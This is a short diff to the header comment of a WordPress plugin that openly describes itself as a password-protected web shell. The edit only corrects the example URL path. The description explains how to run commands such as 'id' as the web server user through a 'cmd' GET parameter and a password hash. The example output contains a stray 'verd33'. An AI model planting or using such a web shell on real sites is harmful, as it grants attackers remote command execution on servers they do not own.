@@ -2,7 +2,7 @@
     /*
     Plugin Name: Password Protected Wordpress Shell
     Plugin URI: https://github.com/random-robbie/wp-theshell/
-    Description: Execute Commands as the webserver you are serving wordpress with! Shell will probably live at /wp-content/plugins/wp-theshell/index.php. Commands can be given using the 'cmd' GET parameter. Eg: "http://192.168.0.1/wp-content/plugins/shell/shell.php?cmd=id&pass=e5bd68701aeec2072ecfd25885692620", should provide you with output such as <code>uid=33(www-data) gid=verd33(www-data) groups=33(www-data)</code>
+    Description: Execute Commands as the webserver you are serving wordpress with! Shell will probably live at /wp-content/plugins/wp-theshell/index.php. Commands can be given using the 'cmd' GET parameter. Eg: "http://192.168.0.1/wp-content/plugins/wp-theshell/index.php?cmd=id&pass=e5bd68701aeec2072ecfd25885692620", should provide you with output such as <code>uid=33(www-data) gid=verd33(www-data) groups=33(www-data)</code>
     Author: Leon Jacobs & Robbie Wiggins
     Version: 0.1
     Author URI: https://github.com/random-robbie/
